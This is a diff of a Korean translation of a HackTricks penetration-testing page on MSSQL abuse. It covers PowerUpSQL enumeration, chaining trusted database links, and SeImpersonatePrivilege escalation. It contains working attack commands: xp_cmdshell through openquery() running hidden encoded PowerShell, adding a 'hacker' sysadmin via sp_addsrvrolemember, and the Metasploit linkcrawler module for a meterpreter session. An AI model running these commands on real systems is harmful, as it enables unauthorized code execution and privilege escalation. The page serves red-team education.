@@ -2,19 +2,24 @@
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)로부터 AWS 해킹을 제로부터 전문가까지 배우세요</strong>!</summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 배우세요!</summary>
 
-* **사이버 보안 회사**에서 일하시나요? **회사가 HackTricks에 광고**되길 원하시나요? 또는 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* **사이버 보안 회사**에서 일하시나요? **회사가 HackTricks에 광고되길 원하시나요**? 또는 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
 * [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요
-* **[💬](https://emojipedia.org/speech-balloon/) Discord 그룹**에 **가입**하거나 [텔레그램 그룹](https://t.me/peass)에 **참여**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
-* **[hacktricks repo](https://github.com/carlospolop/hacktricks) 및 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**로 PR을 제출하여 해킹 트릭을 공유하세요.
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
+* **해킹 트릭을 공유하고 싶으시다면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **로 PR을 제출**하세요.
 
 </details>
 
+<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://websec.nl/" %}
+
+
 ## **MSSQL 열거 / 발견**
 
-파워쉘 모듈 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)은 이 경우에 매우 유용합니다.
+Powershell 모듈 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)은 이 경우에 매우 유용합니다.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
@@ -80,7 +85,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL 신뢰할 수 있는 링크
 
-만약 MSSQL 인스턴스가 다른 MSSQL 인스턴스에 의해 신뢰된다면(데이터베이스 링크), 사용자가 신뢰받는 데이터베이스에 권한이 있다면, **신뢰 관계를 사용하여 다른 인스턴스에서도 쿼리를 실행할 수 있게 될 것**입니다. 이러한 신뢰는 연결될 수 있으며 어느 시점에서는 사용자가 명령을 실행할 수 있는 잘못 구성된 데이터베이스를 찾을 수도 있습니다.
+만약 MSSQL 인스턴스가 다른 MSSQL 인스턴스에 의해 신뢰된다면(데이터베이스 링크), 사용자가 신뢰받는 데이터베이스에 권한이 있다면, **신뢰 관계를 사용하여 다른 인스턴스에서도 쿼리를 실행할 수 있게 될 것**입니다. 이러한 신뢰는 연결될 수 있으며 어느 시점에서 사용자는 명령을 실행할 수 있는 잘못 구성된 데이터베이스를 찾을 수도 있습니다.
 
 **데이터베이스 간의 링크는 숲 간 신뢰를 통해 작동합니다.**
 
@@ -124,28 +129,24 @@ Metasploit를 사용하여 신뢰할 수 있는 링크를 쉽게 확인할 수 �
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-메타스플로잇은 MSSQL에서 `openquery()` 함수만 남용하려고 시도할 것임을 주목하세요 (따라서 `openquery()`로 명령을 실행할 수 없는 경우 명령을 실행하기 위해 `EXECUTE` 방법을 수동으로 시도해야 함을 아래에서 자세히 확인하십시오.)
-
 ### 수동 - Openquery()
 
-**Linux**에서는 **sqsh** 및 **mssqlclient.py**를 사용하여 MSSQL 콘솔 셸을 획득할 수 있습니다.
+**Linux**에서는 **sqsh** 및 **mssqlclient.py**를 사용하여 MSSQL 콘솔 셸을 얻을 수 있습니다.
 
-**Windows**에서는 [**HeidiSQL**](https://www.heidisql.com)과 같은 **MSSQL 클라이언트**를 사용하여 링크를 찾고 명령을 수동으로 실행할 수도 있습니다.
+**Windows**에서는 [**HeidiSQL**](https://www.heidisql.com)과 같은 **MSSQL 클라이언트**를 사용하여 링크를 찾고 명령을 수동으로 실행할 수 있습니다.
 
-_윈도우 인증을 사용하여 로그인:_
+_**Windows 인증을 사용하여 로그인:**_
 
-![](<../../.gitbook/assets/image (167) (1).png>)
-
-#### 신뢰할 수 있는 링크 찾기
+![](<../../.gitbook/assets/image (805).png>)
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![](<../../.gitbook/assets/image (168).png>)
+![](<../../.gitbook/assets/image (713).png>)
 
 #### 신뢰할 수 있는 링크에서 쿼리 실행
 
-링크를 통해 쿼리를 실행합니다 (예: 새로운 접근 가능한 인스턴스에서 더 많은 링크 찾기):
+링크를 통해 쿼리를 실행하십시오 (예: 새로운 접근 가능한 인스턴스에서 더 많은 링크 찾기):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
@@ -153,9 +154,9 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 이중 따옴표와 홑따옴표가 사용된 위치를 확인하세요. 그 방식으로 사용하는 것이 중요합니다.
 {% endhint %}
 
-![](<../../.gitbook/assets/image (169).png>)
+![](<../../.gitbook/assets/image (640).png>)
 
-신뢰할 수 있는 이 링크 체인을 수동으로 계속할 수 있습니다.
+신뢰할 수 있는 이 링크 체인을 수동으로 영원히 계속할 수 있습니다.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -175,6 +176,23 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **MSSQL 로컬 사용자**는 일반적으로 **`SeImpersonatePrivilege`**라는 특별한 권한 유형을 갖습니다. 이를 통해 계정은 "인증 후 클라이언트를 흉내 내는" 것이 가능합니다.
 
-많은 저자들이 고안한 전략은 시스템 서비스를 강제로 악의적인 또는 중간자 공격 서비스에 인증하도록 하는 것입니다. 그럼으로써 공격자가 만든 악성 서비스는 시스템 서비스가 인증을 시도하는 동안 시스템 서비스를 흉내 낼 수 있습니다.
+많은 저자들이 고안한 전략은 시스템 서비스를 로그 또는 중간자 서비스에 인증하도록 강제하는 것입니다. 공격자가 생성한 이 로그 서비스는 시스템 서비스가 인증을 시도하는 동안 시스템 서비스를 흉내 낼 수 있습니다.
 
-[SweetPotato](https://github.com/CCob/SweetPotato)에는 Beacon의 `execute-assembly` 명령을 통해 실행할 수 있는 이러한 다양한 기술들이 모아져 있습니다.
+[SweetPotato](https://github.com/CCob/SweetPotato)에는 Beacon의 `execute-assembly` 명령을 통해 실행할 수 있는 이러한 다양한 기술이 모아져 있습니다.
+
+
+<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://websec.nl/" %}
+
+<details>
+
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 영웅이 되는 AWS 해킹을 배우세요!</summary>
+
+* **사이버 보안 회사**에서 일하시나요? **HackTricks에 귀사를 광고하고 싶으신가요**? 또는 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
+* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 받으세요
+* [**💬**](https://emojipedia.org/speech-balloon/) **Discord 그룹**에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
+* **해킹 요령을 공유하려면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **로 PR을 제출하세요**.
+
+</details>
